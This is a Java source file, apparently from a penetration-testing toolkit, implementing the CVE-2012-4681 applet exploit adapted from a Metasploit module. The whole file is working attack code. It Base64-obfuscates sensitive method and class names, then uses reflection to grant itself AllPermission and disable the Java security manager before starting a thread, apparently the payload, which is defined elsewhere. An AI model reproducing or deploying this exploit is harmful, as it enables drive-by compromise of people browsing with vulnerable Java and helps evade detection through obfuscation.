/*
 * (c) 2012 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * Exploit for CVE-2012-4681
 *
 * Metasploit Framework module: multi/browser/java_jre17_exec
 *
 * Adapted from the BSD licensed Metasploit Framework at:
 * /opt/metasploit/msf3/external/source/exploits/CVE-2012-4681
 */
import java.applet.Applet;
import java.awt.Graphics;
import java.beans.Expression;
import java.beans.Statement;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.*;
import java.security.cert.Certificate;

public class Exec extends Main {
	/* setSecurityManager */
	protected String s = null;
	/* file:/// */
	protected String u = null;
	/* forName */
	protected String f = null;
	/* acc */
	protected String a = null;
	/* sun.awt.ToolKit */
	protected String k = null;
	/* getField */
	protected String g = null;

	public Exec(Applet ap) {
		super(ap);
		try {
			s = new String(Base64.decode("c2V0U2VjdXJpdHlNYW5hZ2Vy"), "UTF-8");
			u = new String(Base64.decode("ZmlsZTovLy8="), "UTF-8");
			f = new String(Base64.decode("Zm9yTmFtZQ=="), "UTF-8");
			a = new String(Base64.decode("YWNj"), "UTF-8");
			k = new String(Base64.decode("c3VuLmF3dC5TdW5Ub29sa2l0"), "UTF-8");
			g = new String(Base64.decode("Z2V0RmllbGQ="), "UTF-8");
		}
		catch (Exception ex) {
		}
	}

	public void check() {
		try {
			Statement localStatement = new Statement(System.class, s, new Object[1]);
			Permissions localPermissions = new Permissions();
			localPermissions.add(new AllPermission());
			ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL(u), new Certificate[0]), localPermissions);
			AccessControlContext localAccessControlContext = new AccessControlContext(new ProtectionDomain[] {
				localProtectionDomain
			});
			sf(Statement.class, a, localStatement, localAccessControlContext);
			localStatement.execute();

			new Thread(this).start();
		}
		catch (Exception ex) {
		}
	}

	private Class gc(String paramString) throws Exception {
		Object arrayOfObject[] = new Object[1];
		arrayOfObject[0] = paramString;
		Expression localExpression = new Expression(Class.class, f, arrayOfObject);
		localExpression.execute();
		return (Class)localExpression.getValue();
	}

	private void sf(Class paramClass, String paramString, Object paramObject1, Object paramObject2) throws Exception {
		Object arrayOfObject[] = new Object[2];
		arrayOfObject[0] = paramClass;
		arrayOfObject[1] = paramString;
		Expression localExpression = new Expression(gc(k), g, arrayOfObject);
		localExpression.execute();
		((Field)localExpression.getValue()).set(paramObject1, paramObject2);
	}
}
